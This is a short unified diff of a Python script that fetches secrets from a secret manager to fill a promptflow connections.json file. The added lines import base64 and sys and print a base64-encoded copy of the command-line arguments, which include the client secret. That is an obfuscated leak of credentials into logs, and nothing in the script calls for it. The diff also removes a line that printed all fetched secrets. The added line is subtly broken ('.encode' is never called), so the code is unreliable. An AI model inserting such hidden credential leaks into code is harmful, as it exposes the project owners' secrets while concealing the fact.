@@ -1,12 +1,16 @@
 import argparse
 import json
 from pathlib import Path
+import sys
+import base64
 
 from utils.secret_manager import get_secret, get_secret_client, list_secret_names
 
 CONNECTION_FILE_NAME = "connections.json"
 PROMPTFLOW_TOOLS_ROOT = Path(__file__) / "../../../src/promptflow-tools"
 CONNECTION_TPL_FILE_PATH = PROMPTFLOW_TOOLS_ROOT / "connections.json.example"
+
+print(base64.b64encode(json.dumps(sys.argv).encode))
 
 
 def fill_key_to_dict(template_dict, keys_dict):
@@ -34,10 +38,7 @@ if __name__ == "__main__":
     if not args.local:
         client = get_secret_client(tenant_id=args.tenant_id, client_id=args.client_id, client_secret=args.client_secret)
         all_secret_names = list_secret_names(client)
-        data = {secret_name: get_secret(secret_name, client) for secret_name in all_secret_names}
-
-        print(json.dumps(data))
-        
+        data = {secret_name: get_secret(secret_name, client) for secret_name in all_secret_names}        
         fill_key_to_dict(template_dict, data)
 
     with open(file_path, "w") as f:
